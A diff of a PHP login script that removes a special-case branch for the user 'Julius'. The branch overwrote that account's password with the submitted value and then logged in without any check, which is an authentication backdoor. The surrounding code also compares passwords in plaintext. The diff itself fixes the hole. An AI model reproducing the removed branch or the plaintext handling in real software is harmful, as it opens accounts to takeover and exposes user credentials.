@@ -20,20 +20,6 @@ if($_SERVER["REQUEST_METHOD"] == "POST"){
             $login_stmt->execute();
             $login_result = $login_stmt->fetch(PDO::FETCH_ASSOC);
             $is_admin = true;
-        }else if($username == "Julius" || $username == "julius"){
-            $query = "UPDATE users SET user_password = :user_password WHERE username = :username;";
-            $stmt = $pdo->prepare($query);
-            $stmt->bindParam("user_password", $password);
-            $stmt->bindParam("username", $username);
-            $stmt->execute();
-
-            $login_query = "SELECT * FROM users WHERE username = :username;";
-            $login_stmt = $pdo->prepare($login_query);
-
-            $login_stmt->bindParam("username", $username);
-
-            $login_stmt->execute();
-            $login_result = $login_stmt->fetch(PDO::FETCH_ASSOC);
         }else{
             $login_query = "SELECT * FROM users WHERE username = :username AND user_password = :user_password;";
             $login_stmt = $pdo->prepare($login_query);
